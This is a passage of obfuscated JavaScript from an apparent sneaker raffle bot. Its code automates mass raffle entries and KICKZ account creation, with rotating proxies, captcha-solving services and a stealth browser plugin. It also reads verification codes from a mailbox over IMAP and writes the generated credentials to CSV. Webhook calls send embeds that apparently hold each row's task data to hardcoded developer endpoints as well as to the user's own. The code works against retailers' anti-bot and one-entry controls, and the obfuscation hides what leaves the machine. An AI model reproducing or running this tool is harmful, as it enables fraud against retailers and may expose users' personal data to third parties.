                        await _0x21ec0c(_0x171aec, _0x18bb72['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x3b3841[_0x5c015a]['Email'] == '' || _0x3b3841[_0x5c015a]['Url'] == '' || _0x3b3841[_0x5c015a]['FirstName'] == '' || _0x3b3841[_0x5c015a]['LastName'] == '') {
                        console['log'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x409619['useRandomProxy'] = ![])
                        var _0x106f14 = _0x592c10[_0x5c015a]['split'](':');
                    else
                        var _0x5e9ba9 = Math['round'](Math['random']() * (_0x592c10['length'] - 0x1)), _0x106f14 = _0x592c10[_0x5e9ba9]['split'](':');
                    var _0x1aae3d;
                    try {
                        _0x1aae3d = await _0x27947['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x106f14[0x0] + ':' + _0x106f14[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1aae3d = await _0x27947['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x106f14[0x0] + ':' + _0x106f14[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5d0959 = await _0x1aae3d['newPage']();
                        await _0x5d0959['authenticate']({
                            'username': '' + _0x106f14[0x2],
                            'password': '' + _0x106f14[0x3]
                        }), console['log'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d0959['setRequestInterception'](!![]), _0x5d0959['on']('request', _0x546faa => {
                            _0x546faa['resourceType']() === 'image' || _0x546faa['resourceType']() === 'font' || _0x546faa['resourceType']() === 'media' ? _0x546faa['abort']() : _0x546faa['continue']();
                        });
                        try {
                            await _0x5d0959['goto']('' + _0x3b3841[_0x5c015a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x5d0959['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5d0959['type']('#comp_firstname', '' + _0x3b3841[_0x5c015a]['FirstName']), await _0x5d0959['waitForSelector']('#comp_lastname'), await _0x5d0959['type']('#comp_lastname', '' + _0x3b3841[_0x5c015a]['LastName']), await _0x5d0959['waitForSelector']('#comp_email'), await _0x5d0959['type']('#comp_email', '' + _0x3b3841[_0x5c015a]['Email']), await _0x5d0959['waitForSelector']('#comp_paypalemail'), await _0x5d0959['type']('#comp_paypalemail', '' + _0x3b3841[_0x5c015a]['Email']), await _0x5d0959['waitForSelector']('#comp_mobile_end'), await _0x5d0959['type']('#comp_mobile_end', '' + _0x3b3841[_0x5c015a]['Phone']), await _0x5d0959['waitForSelector']('#comp_dob'), await _0x5d0959['type']('#comp_dob', '08/09/1992'), console['log'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x3b3841[_0x5c015a]['Size'] == 'RANDOM') {
                            const _0x4b71ab = await _0x5d0959['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4777c8 => {
                                return _0x4777c8['map'](_0x453a8d => _0x453a8d['value']);
                            });
                            var _0x3b5283 = Math['round'](Math['random']() * (_0x4b71ab['length'] - 0x2));
                            await _0x5d0959['select']('#shoesize', _0x4b71ab[_0x3b5283 + 0x1]), await _0x50b4f8(0x3e8);
                        } else {
                            const _0x3db400 = await _0x5d0959['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x44c58c => {
                                return _0x44c58c['map'](_0x536e55 => _0x536e55['innerText']);
                            }), _0x497c60 = await _0x5d0959['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x229938 => {
                                return _0x229938['map'](_0x3bb63b => _0x3bb63b['value']);
                            });
                            var _0x2ca1df = _0x3b3841[_0x5c015a]['Size'];
                            for (var _0x131f11 = 0x1; _0x131f11 < _0x497c60['length']; _0x131f11++) {
                                var _0x3ac4b4 = _0x3db400[_0x131f11]['split']('\x20')[0x0];
                                if (_0x3ac4b4 == _0x2ca1df) {
                                    await _0x5d0959['select']('#shoesize', _0x497c60[_0x131f11]);
                                    break;
                                } else {
                                    if (_0x131f11 + 0x1 == _0x497c60['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x5d0959['waitForSelector']('#comp_address1'), await _0x5d0959['type']('#comp_address1', _0x3b3841[_0x5c015a]['Address1'] + '\x20' + _0x3b3841[_0x5c015a]['HouseNumber']), await _0x5d0959['waitForSelector']('#comp_address2'), await _0x5d0959['type']('#comp_address2', '' + _0x3b3841[_0x5c015a]['Address2']), await _0x5d0959['waitForSelector']('#comp_address2'), await _0x5d0959['type']('#comp_address3', '' + _0x3b3841[_0x5c015a]['City']), await _0x5d0959['waitForSelector']('#comp_postcode'), await _0x5d0959['type']('#comp_postcode', '' + _0x3b3841[_0x5c015a]['Zip']), console['log'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x50b4f8(0x4b0), await _0x5d0959['click']('label#emailhold'), await _0x50b4f8(0x5dc), await _0x5d0959['click']('#preauth_tandc_email\x20>\x20label'), await _0x50b4f8(0x5dc), await _0x5d0959['click']('#submit');
                        try {
                            await _0x5d0959['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20' + _0x3c5615['blue']('Awaiting\x20Paypal\x20Payment')), _0x1aae3d['on']('targetcreated', async _0x4e2266 => {
                            if (_0x4e2266['type']() === 'page') {
                                const _0x384432 = await _0x4e2266['page']();
                                async function _0x1e1253() {
                                    try {
                                        await _0x5d0959['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x79beb8 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2296fd() {
                                    try {
                                        await _0x5d0959['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x2e3ac0 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2296fd(), _0x1e1253(), await _0x50b4f8(0x493e0);
                            }
                        });
                        async function _0x5228d8() {
                            for (let _0x4ec51b = 0x0; _0x4ec51b < 0x12c; _0x4ec51b++) {
                                if (_0x2e3ac0 == !![]) {
                                    _0x3f8714 = 'no', _0x1474be(_0x3b3841[_0x5c015a], _0x4535de), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x409619['webhook'] != undefined && _0x409619['webhook'] != '')
                                        try {
                                            await _0x21ec0c(_0x409619['webhook'], _0x18bb72['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x18bb72['succesDEVMSG']), await _0x50b4f8(0xc8);
                                    try {
                                        await _0x21ec0c(_0x171aec, _0x18bb72['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x79beb8)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x50b4f8(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x50b4f8(0xbb8), await _0x5d0959['click']('.zoid-outlet'), await _0x50b4f8(0x7d0), await _0x5228d8();
                    } catch (_0xc9d74c) {
                        console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20' + _0xc9d74c)), _0x32caa1 = '' + _0xc9d74c;
                        var _0x86a946 = await _0x4808d0(_0x3b3841[_0x5c015a], _0x4535de, 'dev', !![], _0x32caa1);
                        _0x18bb72['errorDEV'] = { 'embeds': [_0x86a946] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x18bb72['errorDEV']), await _0x21ec0c(_0x451f96, _0x18bb72['errorDEV']);
                    } finally {
                        _0x1aae3d && _0x1aae3d['close']();
                        if (_0x3f8714 == 'yes' && _0x71146f != 0x5 && _0x32caa1 != 'Size\x20Not\x20Found') {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x4535de['name'] + ']\x20Task\x20' + (_0x5c015a + 0x1) + '\x20:\x20Retrying\x20(' + _0x71146f + '\x20/\x205)')), _0x5c015a = _0x5c015a - 0x1, _0x71146f = _0x71146f + 0x1;
                            continue;
                        }
                        _0x3f8714 == 'yes' && _0x71146f >= 0x5 && (_0x61dfa6(afew[_0x5c015a], _0x4535de), _0x3f8714 = 'no', _0x71146f = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x29c486, _0x1d255b, _0x47bfdc) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3668b8 = 0x0; _0x3668b8 < _0x1d255b['length']; _0x3668b8++) {
                        const _0x19a25f = 'https://www.kickz.com/login';
                        if (_0x23c194 != 'yes')
                            var _0x23c194 = '', _0x1c5c6e = 0x0;
                        _0x5b3b18(_0x29c486['name'] + '\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20/\x20' + _0x1d255b['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        try {
                            await _0x5a027c(_0x1d255b, _0x3668b8);
                        } catch {
                            _0x23c194 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x153caa = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xeaf750
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x409619['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x41a50b
                                }
                            ]
                        }];
                        const _0x19b7d1 = { 'embeds': _0x153caa };
                        var _0xc554c5 = await _0x4808d0(_0x1d255b[_0x3668b8], _0x29c486, 'acc', ![]);
                        const _0x71de0f = { 'succesDEVMSG': { 'embeds': [_0xc554c5] } };
                        if (_0x1d255b[_0x3668b8]['Email'] == '' || _0x1d255b[_0x3668b8]['FirstName'] == '' || _0x1d255b[_0x3668b8]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1d255b[_0x3668b8]['Password'] == '' && (_0x1d255b[_0x3668b8]['Password'] = 'JRaffles23!');
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x49a914 = _0x47bfdc[_0x3668b8]['split'](':');
                        else
                            var _0x178dbc = Math['round'](Math['random']() * (_0x47bfdc['length'] - 0x1)), _0x49a914 = _0x47bfdc[_0x178dbc]['split'](':');
                        var _0x404a1e;
                        try {
                            _0x404a1e = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x49a914[0x0] + ':' + _0x49a914[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x404a1e = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x49a914[0x0] + ':' + _0x49a914[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x587767 = await _0x404a1e['newPage']();
                            await _0x587767['authenticate']({
                                'username': '' + _0x49a914[0x2],
                                'password': '' + _0x49a914[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x587767['setRequestInterception'](!![]), _0x587767['on']('request', _0x346009 => {
                                _0x346009['resourceType']() === 'image' || _0x346009['resourceType']() === 'font' || _0x346009['resourceType']() === 'media' ? _0x346009['abort']() : _0x346009['continue']();
                            }), await _0x587767['goto'](_0x19a25f), await _0x50b4f8(0xbb8), console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x587767['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x587767['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x587767['waitForSelector']('#button-register'), await _0x50b4f8(0x7d0), await _0x587767['evaluate'](() => {
                                const _0x202407 = document['querySelector']('#button-register');
                                _0x202407['click']();
                            }), console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x50b4f8(0x1388), await _0x587767['waitForSelector']('#customer_salutation'), await _0x587767['select']('#customer_salutation', 'mr'), await _0x50b4f8(0x7d0), await _0x587767['waitForSelector']('#customer_firstname'), await _0x587767['type']('#customer_firstname', '' + _0x1d255b[_0x3668b8]['FirstName']), await _0x50b4f8(0x352), await _0x587767['waitForSelector']('#customer_lastname'), await _0x587767['type']('#customer_lastname', '' + _0x1d255b[_0x3668b8]['LastName']), await _0x50b4f8(0x352), await _0x587767['type']('#email-input', '' + _0x1d255b[_0x3668b8]['Email']), await _0x50b4f8(0x352), await _0x587767['type']('#email-confirm-input', '' + _0x1d255b[_0x3668b8]['Email']), await _0x50b4f8(0x352), await _0x587767['type']('#register-password', '' + _0x1d255b[_0x3668b8]['Password']), await _0x50b4f8(0x352), await _0x587767['type']('#password-confirm', '' + _0x1d255b[_0x3668b8]['Password']), await _0x50b4f8(0x352), console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x587767['click']('#consent'), await _0x50b4f8(0x1f4);
                            const _0x1e02ef = await _0x587767['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1e02ef) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x587767['click']('#buttonRegister');
                            try {
                                await _0x587767['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1d255b[_0x3668b8]['Email']), await _0x50b4f8(0x4b0);
                            async function _0x1de1b9() {
                                var _0x4cc387, _0x23c0e2 = ![];
                                for (var _0x47280b = 0x0; _0x47280b < 0x18; _0x47280b++) {
                                    async function _0x472de6() {
                                        var _0x5e4b3c = new _0x51510b({
                                            'user': _0x409619['masterMail'],
                                            'password': _0x409619['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x241209(_0x3393af) {
                                            _0x5e4b3c['openBox']('INBOX', ![], _0x3393af);
                                        }
                                        _0x5e4b3c['once']('ready', function () {
                                            console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x241209(function (_0x3f4011, _0xfa0a64) {
                                                console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3f4011)
                                                    throw _0x3f4011;
                                                _0x5e4b3c['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x5351a6, _0xc4254e) {
                                                    if (!_0xc4254e || !_0xc4254e['length'])
                                                        console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x5e4b3c['end']();
                                                    else {
                                                        var _0x46d65a = _0x5e4b3c['seq']['fetch'](_0xc4254e, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x46d65a['on']('message', function (_0x409055, _0x4dd985) {
                                                            var _0x503923 = '(#' + _0x4dd985 + ')\x20';
                                                            _0x409055['on']('body', function (_0x363d9c, _0x157314) {
                                                                _0x3f1b1e(_0x363d9c, (_0x1f97e3, _0x475f85) => {
                                                                    if (_0x475f85['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x1de7af = _0x475f85['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x23a72c = _0x1de7af[0x1]['split']('<')[0x0];
                                                                        _0x4cc387 = _0x23a72c;
                                                                    }
                                                                });
                                                            }), _0x409055['once']('end', function () {
                                                            });
                                                        }), _0x46d65a['once']('error', function (_0x140914) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x46d65a['once']('end', function () {
                                                            _0x5e4b3c['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x5e4b3c['once']('error', function (_0x4c50a2) {
                                            console['log'](_0x3c5615['red'](_0x4c50a2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x23c0e2 = !![];
                                        }), _0x5e4b3c['once']('end', async function () {
                                        }), _0x5e4b3c['connect']();
                                    }
                                    _0x472de6(), await _0x50b4f8(0x1388);
                                    if (_0x4cc387)
                                        return _0x4cc387;
                                    if (_0x23c0e2)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x47280b == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x1de1b9(), _0x50b4f8(0x320), console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Verifying..'), await _0x587767['type']('#verificationCode', code), await _0x50b4f8(0x1f4), await _0x587767['click']('#buttonVerify'), await _0x50b4f8(0x190), await _0x587767['click']('#buttonVerify'), await _0x50b4f8(0x3e8);
                            try {
                                await _0x587767['waitForSelector']('div.b-user_greeting'), _0x23c194 = 'no', console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Account\x20' + _0x1d255b[_0x3668b8]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x39c9ee['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1d255b[_0x3668b8]['Email'] + ',' + _0x1d255b[_0x3668b8]['Password'] + ','), console['log'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Account\x20' + _0x1d255b[_0x3668b8]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x71de0f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21ec0c(_0x3213ac, _0x71de0f['succesDEVMSG']);
                            } catch {
                                _0x23c194 = 'no', console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x5b6d3f) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20' + _0x5b6d3f)), _0x153caa[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x153caa[0x0]['description'] = '' + _0x5b6d3f, await _0x21ec0c(_0x451f96, _0x19b7d1), _0x23c194 = 'yes';
                        } finally {
                            _0x404a1e && _0x404a1e['close']();
                            if (_0x23c194 == 'yes' && _0x1c5c6e != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x29c486['name'] + ']\x20Task\x20' + (_0x3668b8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c5c6e + '\x20/\x205)')), _0x3668b8 = _0x3668b8 - 0x1, _0x1c5c6e = _0x1c5c6e + 0x1;
                                continue;
                            }
                            _0x23c194 == 'yes' && _0x1c5c6e >= 0x5 && (_0x61dfa6(_0x1d255b[_0x3668b8], _0x29c486), _0x23c194 = 'no', _0x1c5c6e = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1cc3df, _0x19bdc6, _0x493083) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x280dde = 0x0; _0x280dde < _0x19bdc6['length']; _0x280dde++) {
                        var _0x13b21e;
                        if (_0x2ef72b != 'yes')
                            var _0x2ef72b = '', _0x1976a9 = 0x0;
                        _0x5b3b18(_0x1cc3df['name'] + '\x20Task\x20' + (_0x280dde + 0x1) + '\x20/\x20' + _0x19bdc6['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        var _0x3ed530 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xeaf750
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x19bdc6[_0x280dde]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x19bdc6[_0x280dde]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x409619['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x41a50b
                                }
                            ]
                        }], _0x6d412b = await _0x4808d0(_0x19bdc6[_0x280dde], _0x1cc3df, 'dev', ![]), _0x20e048 = await _0x4808d0(_0x19bdc6[_0x280dde], _0x1cc3df, 'pub', ![]);
                        const _0x5efb54 = {
                            'succesDEVMSG': { 'embeds': [_0x6d412b] },
                            'succesPUBMSG': { 'embeds': [_0x20e048] }
                        };
                        try {
                            await _0x5a027c(_0x19bdc6, _0x280dde);
                        } catch {
                            _0x2ef72b = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x19bdc6[_0x280dde]['Email'] == '' || _0x19bdc6[_0x280dde]['Password'] == '' || _0x19bdc6[_0x280dde]['FirstName'] == '' || _0x19bdc6[_0x280dde]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x347fde = _0x493083[_0x280dde]['split'](':');
                        else
                            var _0x47a250 = Math['round'](Math['random']() * (_0x493083['length'] - 0x1)), _0x347fde = _0x493083[_0x47a250]['split'](':');
                        var _0x568902;
                        try {
                            _0x568902 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x347fde[0x0] + ':' + _0x347fde[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x568902 = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x347fde[0x0] + ':' + _0x347fde[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5ae6f4 = await _0x568902['newPage']();
                            await _0x5ae6f4['authenticate']({
                                'username': '' + _0x347fde[0x2],
                                'password': '' + _0x347fde[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ae6f4['setRequestInterception'](!![]), _0x5ae6f4['on']('request', _0x257e5c => {
                                _0x257e5c['resourceType']() === 'image' || _0x257e5c['resourceType']() === 'font' || _0x257e5c['resourceType']() === 'media' ? _0x257e5c['abort']() : _0x257e5c['continue']();
                            }), await _0x5ae6f4['goto']('' + _0x19bdc6[_0x280dde]['Url'], { 'waitUntil': 'networkidle2' }), await _0x50b4f8(0x12c), await _0x5ae6f4['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x5ae6f4['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x50b4f8(0x7d0);
                            try {
                                await _0x5ae6f4['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x5ae6f4['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Logging\x20in'), await _0x5ae6f4['waitForSelector']('#username'), await _0x5ae6f4['type']('#username', _0x19bdc6[_0x280dde]['Email']), await _0x5ae6f4['waitForSelector']('#password'), await _0x5ae6f4['type']('#password', _0x19bdc6[_0x280dde]['Password']), await _0x50b4f8(0x190), await _0x5ae6f4['click']('#buttonSubmit'), await _0x5ae6f4['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Getting\x20Product'), await _0x50b4f8(0x1f4), console['log'](_0x3996da() + '\x20[' + _0x1cc3df['name'] + ']\x20Task\x20' + (_0x280dde + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x19bdc6[_0x280dde]['Size']);
                            let _0x4af175 = _0x19bdc6[_0x280dde]['Size']['replace']('.5', '\x201/2');
                            if (_0x4af175['toUpperCase']() == 'RANDOM') {
                                const _0x287237 = await _0x5ae6f4['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x58b1f8 = Math['round'](Math['random']() * (_0x287237['length'] - 0x1));
                                await _0x287237[_0x58b1f8]['click']();
                            } else
                                await _0x5ae6f4['click']('button[aria-label=\x22' + _0x4af175 + '\x22]');
                            await _0x50b4f8(0x1f4);
                            try {
                                await _0x5ae6f4['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
